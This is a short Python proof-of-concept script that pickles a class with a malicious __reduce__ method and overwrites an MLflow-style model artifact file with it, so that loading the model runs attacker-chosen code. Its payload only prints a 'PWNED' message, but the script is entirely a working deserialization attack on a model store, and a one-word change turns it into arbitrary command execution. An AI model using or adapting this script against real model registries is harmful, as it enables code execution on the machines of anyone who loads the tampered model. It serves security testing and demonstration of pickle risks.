import glob, pickle

class Evil:
    def __reduce__(self):
        return (print, ("PWNED: attacker code ran while the model was loading",))

path = glob.glob("mlartifacts/*/models/*/artifacts/model.pkl")[0]
with open(path, "wb") as f:
    pickle.dump(Evil(), f)
print("Overwrote", path)
